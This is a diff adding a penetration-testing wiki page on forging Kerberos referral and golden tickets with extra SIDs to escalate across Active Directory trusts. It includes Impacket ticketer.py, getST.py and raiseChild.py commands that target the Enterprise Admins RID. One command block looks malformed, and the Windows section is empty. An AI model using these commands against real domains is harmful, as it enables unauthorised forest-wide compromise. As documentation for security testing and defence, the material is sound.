@@ -1,0 +1,55 @@
+---
+title: "Forging Tickets Across Trusts"
+description: "Adding extra SIDs to referral and golden tickets to cross a trust"
+---
+
+## Theory
+When forging a[ referral ticket](#referral-ticket), or a [golden ticket](#golden-ticket), additional security identifiers (SIDs) can be added as "extra SID" and be considered as part of the user's [SID history](/ad/movement/domain-trusts#sid-history) when authenticating.
+
+<Tabs items={['UNIX-like', 'Windows']}>
+<Tab value="UNIX-like">
+
+From UNIX-like systems, [Impacket](https://github.com/fortra/impacket) scripts (Python) can be used for that purpose.
+
+* ticketer.py to forge tickets
+* getST.py to request service tickets
+* lookupsid.py to retrieve the domains' SIDs
+
+If SID filtering is disabled, set the RID to 519 to act as Enterprise Admin.
+
+If SID filtering is partially enabled, set the RID >=1000.
+
+### **Referral ticket**
+
+```bash
+# 1. forge the ticket
+ticketer.py -nthash "inter-realm key" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" -spn "krbtgt/root_domain_fqdn" "someusername"
+
+# 2. use it to request a service ticket
+KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "root_domain_fqdn/someusername@root_domain_fqdn"
+```
+```bash
+ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "-" "someusername"
+```
+
+### **Golden ticket**
+
+```bash
+# 1. forge the ticket
+ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" "someusername"
+```
+
+Impacket's [raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled (retrieving the SIDs, dumping the trusted domain's krbtgt, forging the ticket, dumping the forest root keys, etc.). It will forge a ticket with the Enterprise Admins extra SID.
+
+```bash
+raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD"
+```
+
+</Tab>
+
+<Tab value="Windows">
+
+
+
+</Tab>
+</Tabs>
